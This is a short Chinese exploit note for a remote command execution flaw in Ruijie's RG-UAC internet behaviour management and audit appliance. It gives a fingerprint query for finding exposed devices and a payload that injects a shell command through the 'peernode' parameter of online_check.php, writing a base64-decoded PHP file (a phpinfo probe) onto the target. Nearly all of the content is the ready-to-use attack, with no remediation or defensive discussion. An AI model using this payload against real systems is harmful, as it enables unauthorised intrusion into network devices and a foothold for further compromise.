# RG-UAC锐捷统一上网行为管理与审计系统存在远程代码执行漏洞

锐捷 ｜ 命令执行 ｜ —
- **指纹**：`app="Ruijie-RG-UAC"`
- **请求**：`http://ip/view/vpn/autovpn/123.php`

**Payload**
```
/view/vpn/autovpn/online\_check.php?peernode=  `echo PD9waHAgcGhwaW5mbygpOw==  base64 -d > 123.php`
```